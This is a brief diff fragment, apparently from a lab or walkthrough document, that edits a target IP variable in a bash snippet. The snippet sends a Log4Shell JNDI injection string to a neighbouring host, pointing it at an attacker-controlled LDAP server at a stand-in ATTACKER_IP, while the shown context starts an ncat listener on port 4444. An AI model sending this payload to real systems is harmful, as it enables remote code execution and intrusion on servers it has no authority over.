@@ -54,7 +54,7 @@ ncat -lvnp 4444 &
 ```
 
 ```bash
-NEIGHBOR_IP=172.31.70.56
+NEIGHBOR_IP=
 curl -H "X-Api-Version: \${jndi:ldap://${ATTACKER_IP}:1389/Exploit}" \
   http://$NEIGHBOR_IP:8080/ &
 ```
